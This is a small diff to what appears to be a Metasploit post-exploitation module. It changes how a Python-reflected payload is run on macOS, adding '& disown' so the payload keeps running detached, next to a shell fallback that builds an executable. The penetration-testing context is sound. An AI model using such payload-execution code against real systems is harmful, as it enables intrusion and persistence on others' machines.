@@ -181,7 +181,7 @@ class MetasploitModule < Msf::Post
     when 'osx'
       vprint_status("Transfer method: Python [OSX]")
       payload_data = Msf::Util::EXE.to_python_reflection(framework, ARCH_X64, payload_data, {})
-      cmd_exec("echo \"#{payload_data}\" | python")
+      cmd_exec("echo \"#{payload_data}\" | python & disown")
     else
       vprint_status("Transfer method: Bourne shell [fallback]")
       exe = Msf::Util::EXE.to_executable(framework, larch, lplat, payload_data)
